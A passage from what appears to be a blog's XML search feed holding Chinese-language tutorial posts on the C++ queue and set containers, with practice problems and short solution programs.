<td align="left">元素个数</td>
<td align="left">size()</td>
<td align="left">获取队列中的元素个数，返回int</td>
</tr>
<tr>
<td align="left">获取队首元素</td>
<td align="left">front()</td>
<td align="left">获取队列第一个元素</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> queueArray[<span class="number">1000</span>], sIndex = <span class="number">0</span>, eIndex = <span class="number">-1</span>;<span class="comment">//表示队列里没有元素</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    eIndex++;</span><br><span class="line">    queueArray[eIndex] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> value = queueArray[sIndex];</span><br><span class="line">    sIndex++;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> queueArray[sIndex];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> eIndex - sIndex + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">push</span>(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;队首:&quot;</span> &lt;&lt; <span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;大小:&quot;</span> &lt;&lt; <span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;队首:&quot;</span> &lt;&lt; <span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;大小:&quot;</span> &lt;&lt; <span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;队首:&quot;</span> &lt;&lt; <span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;大小:&quot;</span> &lt;&lt; <span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="queue的基本操作"><a href="#queue的基本操作" class="headerlink" title="queue的基本操作"></a>queue的基本操作</h2><p>在 C++ 的标准库中， 有封装好的队列 queue ， queue 是一个模板类，定义 queue 对象的示例代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">queue&lt;<span class="type">double</span>&gt; q2;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">代码</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">入队</td>
<td align="left">q.push(x)</td>
<td align="left">将x元素放到队列的末端</td>
</tr>
<tr>
<td align="left">出队</td>
<td align="left">q.pop()</td>
<td align="left">弹出队列的第一个元素，并不会返回元素的值</td>
</tr>
<tr>
<td align="left">队首元素</td>
<td align="left">q.front()</td>
<td align="left">获取队列的第一个元素</td>
</tr>
<tr>
<td align="left">队尾元素</td>
<td align="left">q.back()</td>
<td align="left">获取队列的最后一个元素</td>
</tr>
<tr>
<td align="left">元素个数</td>
<td align="left">q.size()</td>
<td align="left">获取队中的元素个数，返回int</td>
</tr>
<tr>
<td align="left">判空</td>
<td align="left">q.empty()</td>
<td align="left">队列是否为空，返回bool，相当于q.size() &#x3D;&#x3D; 0</td>
</tr>
</tbody></table>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="操作队列"><a href="#操作队列" class="headerlink" title="操作队列"></a>操作队列</h3><p>有一个初始为空的队列，我们对这个队列进行 n 次操作，操作共分为 2 种：</p>
<p>1.1x （将数字 x 放到队列的末尾）</p>
<p>2.2 （将队列最前面的数字弹出队列）</p>
<p>对于第 2 种操作，你需要把弹出的这个数字输出，如果进行操作 2 时，队列为空，则输出”empty” 。</p>
<p>例如： n&#x3D;5 ，对应的操作为：</p>
<p>1123 （操作后队列里面的元素为： 123 ）</p>
<p>1234 （操作后队列里面的元素为： 123,234 ）</p>
<p>2 （输出： 123 ，操作后队列里面的元素为： 234 ）</p>
<p>2 （输出： 234 ，操作后队列里面的元素为：空）</p>
<p>2 （输出： empty ）</p>
<p>对应后面 3 个第 2 类操作，你的程序需要输出，</p>
<p>123</p>
<p>234</p>
<p>empty</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行： 1 个数 n(1≤n≤10000)<br>后面 n 行：每行 1 种操作， 1X 或者 2 （ 0≤x≤10000)</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>对应所有操作 2 ，输出被弹出的数或者” empty”</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">1 123</span><br><span class="line">1 234</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123</span><br><span class="line">234</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> x, y;</span><br><span class="line">		cin &gt;&gt; x;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			cin &gt;&gt; y;</span><br><span class="line">			q.<span class="built_in">push</span>(y);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (q.<span class="built_in">empty</span>())</span><br><span class="line">			&#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;empty&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; endl;</span><br><span class="line">				q.<span class="built_in">pop</span>();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="堆牌问题"><a href="#堆牌问题" class="headerlink" title="堆牌问题"></a>堆牌问题</h3><p>桌上有一叠牌，从顶面的牌开始往底面依次编号为 1 ～ n 。当至少还剩两张牌时进行以下操作：把第一张扔掉，然后把新的第一张放到整叠牌的最后。</p>
<h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>输入一个正整数 n ， 2≤n≤1000000 ，表示起始时牌的张数</p>
<h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一行，按顺序输出每次扔掉的牌的编号，最后输出最后剩下的牌的编号，两个数之间用一个空格隔开。</p>
<h4 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure>

<h4 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 3 5 7 4 2 6</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;=n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		q.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	<span class="keyword">while</span> (q.<span class="built_in">size</span>() != <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		q.<span class="built_in">push</span>(q.<span class="built_in">front</span>());</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>set</title>
    <url>/2023/01/26/set/</url>
    <content><![CDATA[<h2 id="set关联式容器"><a href="#set关联式容器" class="headerlink" title="set关联式容器"></a>set关联式容器</h2><p>set作为一个容器也是用来存储同一数据类型的数据类型，并且能从一个数据集合中取出数据，在set中每个元素的值都唯一，而且系统能根据元素的值自动进行排序。应该注意的是set中数元素的值不能直接被改变</p>
<h2 id="set的用法"><a href="#set的用法" class="headerlink" title="set的用法"></a>set的用法</h2><h3 id="set的定义"><a href="#set的定义" class="headerlink" title="set的定义"></a>set的定义</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;类型&gt; 对象名;</span><br></pre></td></tr></table></figure>

<h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">8</span>);</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">8</span>); <span class="comment">//重复元素不会插入</span></span><br></pre></td></tr></table></figure>

<h3 id="set的遍历"><a href="#set的遍历" class="headerlink" title="set的遍历"></a>set的遍历</h3><p> set的遍历也是使用迭代器进行遍历， 可以正序遍历也可以反序遍历。</p>
<h4 id="正序遍历"><a href="#正序遍历" class="headerlink" title="正序遍历"></a>正序遍历</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">set&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span> (it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl;</span><br></pre></td></tr></table></figure>

<h4 id="反序遍历"><a href="#反序遍历" class="headerlink" title="反序遍历"></a>反序遍历</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">set&lt;<span class="type">int</span>&gt;::reverse_iterator it;</span><br><span class="line"><span class="keyword">for</span> (it = s.<span class="built_in">rbegin</span>(); it != s.<span class="built_in">rend</span>(); it++)</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl</span><br></pre></td></tr></table></figure>

<h2 id="容器与迭代器"><a href="#容器与迭代器" class="headerlink" title="容器与迭代器"></a>容器与迭代器</h2><table>
<thead>
<tr>
<th align="left">容器</th>
<th align="left">迭代器功能</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">vector</td>
<td align="left">随机访问</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">deque</td>
<td align="left">随机访问</td>
<td align="left">双端队列，可以从前后 pusℎ,pop 元素</td>
</tr>
<tr>
<td align="left">list</td>
<td align="left">双向</td>
<td align="left">链表</td>
</tr>
<tr>
<td align="left">set&#x2F;multiset</td>
<td align="left">双向</td>
<td align="left">multiset 是允许有重复元素的 set ，元素保持有序</td>
</tr>
<tr>
<td align="left">map&#x2F;multimap</td>
<td align="left">双向</td>
<td align="left">multimap 是允许有重复元素的 map，元素是 pair保持有序</td>
</tr>
<tr>
<td align="left">stack</td>
<td align="left">不支持迭代器</td>
<td align="left">栈</td>
</tr>
<tr>
<td align="left">queue</td>
<td align="left">不支持迭代器</td>
<td align="left">队列</td>
</tr>
<tr>
<td align="left">priority_queue</td>
<td align="left">不支持迭代器</td>
<td align="left">优先队列，每次可以从栈顶取出当前最小</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">容器</th>
<th align="left">添加元素的效率</th>
<th align="left">删除元素的效率</th>
<th align="left">查找元素</th>
<th align="left">访问中间的元素</th>
</tr>
</thead>
<tbody><tr>
<td align="left">vector</td>
<td align="left">加在尾部 O(1) ，加在中间 O(n) 。</td>
<td align="left">O(n)</td>
<td align="left">O(n)</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">list</td>
<td align="left">O(1)</td>
<td align="left">O(1)</td>
<td align="left">O(n)</td>
<td align="left">O(n)</td>
</tr>
<tr>
<td align="left">stack</td>
<td align="left">只能加在栈顶 O(1)</td>
<td align="left">只能删除栈顶 O(1)</td>
<td align="left">无法查找</td>
<td align="left">无法访问</td>
</tr>
<tr>
<td align="left">queue</td>
<td align="left">只能加在队尾 O(1)</td>
<td align="left">只能删除队首 O(1)</td>
<td align="left">无法查找</td>
<td align="left">无法访问</td>
</tr>
<tr>
<td align="left">set&#x2F;map</td>
<td align="left">O(log(n))</td>
<td align="left">O(log(n))</td>
<td align="left">O(log(n))</td>
<td align="left">O(n) 更高效率的访问需要自己实现</td>
</tr>
</tbody></table>
<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">begin</span>(),               <span class="comment">//返回set容器的第一个元素</span></span><br><span class="line"><span class="built_in">end</span>(),                 <span class="comment">//返回set容器的最后一个元素</span></span><br><span class="line"><span class="built_in">clear</span>(),               <span class="comment">//删除set容器中的所有的元素</span></span><br><span class="line"><span class="built_in">empty</span>(),               <span class="comment">//判断set容器是否为空</span></span><br><span class="line"><span class="built_in">max_size</span>(),            <span class="comment">//返回set容器可能包含的元素最大个数</span></span><br><span class="line"><span class="built_in">size</span>(),                <span class="comment">//返回当前set容器中的元素个数</span></span><br><span class="line"><span class="built_in">rbegin</span>(),              <span class="comment">//返回的值和end()相同</span></span><br><span class="line"><span class="built_in">rend</span>(),                <span class="comment">//返回的值和begin()相同</span></span><br><span class="line"><span class="built_in">erase</span>(iterator),       <span class="comment">//删除定位器iterator指向的值</span></span><br><span class="line"><span class="built_in">erase</span>(first,second),   <span class="comment">//删除定位器first和second之间的值</span></span><br><span class="line"><span class="built_in">erase</span>(key_value),      <span class="comment">//删除键值key_value的值</span></span><br><span class="line"><span class="built_in">find</span>() ，              <span class="comment">//返回给定值值得定位器，如果没找到则返回end()。</span></span><br><span class="line">  </span><br><span class="line">set中还有两个非常重要的函数，lower_bound（）和upper_bound（）。这两个函数都需要传入一个值。</span><br><span class="line">lower_bound返回的是大于或等于被查询元素的第一个元素位置的迭代器，如果找不到，迭代器则为set.<span class="built_in">end</span>() 。</span><br><span class="line">upper_bound返回值则是&gt;给定val的最小指针（iterator）。</span><br><span class="line"><span class="built_in">rbegin</span>() 和 <span class="built_in">rend</span>()为反向迭代器。</span><br></pre></td></tr></table></figure>

<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="数字去重"><a href="#数字去重" class="headerlink" title="数字去重"></a>数字去重</h3><p>给出一个包含 n 个元素的数组 A ，去掉 A 中重复的数字并从小到大排序输出。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行： 1 个数 n 表示数组的长度（ 2≤n≤100000 ）。<br>第 2 至 n+1 行：每行 1 个数，对应数组的元素（ 1≤a[i]≤109 ）</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出去重并从小到大排序好的数组，每行一个数。</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">10</span><br><span class="line">8</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br><span class="line">8</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>输出去重并从小到大排序好的数组，每行一个数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line">	<span class="type">int</span> x;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; x;</span><br><span class="line">		s.<span class="built_in">insert</span>(x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小明爱集合"><a href="#小明爱集合" class="headerlink" title="小明爱集合"></a>小明爱集合</h3><p>最近小明又喜欢上了集合，于是他提出了很多有关集合的问题，其中的一个问题是给你两个集合（集合内部没有重复的元素），让你求集合的相似度是多少，集合的相似度定义如下：</p>
<p>2 个集合的相似度 &#x3D; 相同元素的个数&#x2F;(相同元素个数+不同元素个数)</p>
<p>聪明的你可以帮助小明解决这个问题吗？</p>
<h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>题目含有多组数据，第一行一个数 T ，表示数据的组数；<br>对于每组数据：<br>第一行包括两个数 n,m ，分别表示两个集合元素的个数( 1≤n,m&lt;100000) ；<br>第二行 n 个数表示前一集合的 n 个数，以空格隔开；<br>第三行 m 个数表示后一集合的 m 个数，以空格隔开；<br>其中对于两集合中任意数 ai ，有 0≤ai≤max(2×n,2×m) 。</p>
<h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>对于每组数据，输出两个集合的相似度，输出结果乘 100 后取整数部分。</p>
<h4 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">2 3</span><br><span class="line">1 2 </span><br><span class="line">2 3 4</span><br><span class="line">3 3</span><br><span class="line">5 3 4</span><br><span class="line">3 4 1</span><br></pre></td></tr></table></figure>

<h4 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">25</span><br><span class="line">50</span><br></pre></td></tr></table></figure>

<h4 id="数据范围-1"><a href="#数据范围-1" class="headerlink" title="数据范围"></a>数据范围</h4><p>对于每组数据，输出两个集合的相似度，输出结果乘 100 后取整数部分。</p>
<p>思路：利用set统计两个集合去重合并后的元素数量L，两个集合长度之和 - L &#x3D; 相同元素的数量。因此可以快速计算相似度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m,t;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m+n;i++)&#123;</span><br><span class="line">			<span class="type">int</span> x;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">			s.<span class="built_in">insert</span>(x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(m+n-s.<span class="built_in">size</span>())*<span class="number">100</span>/s.<span class="built_in">size</span>());</span><br><span class="line">		s.<span class="built_in">clear</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
</search>
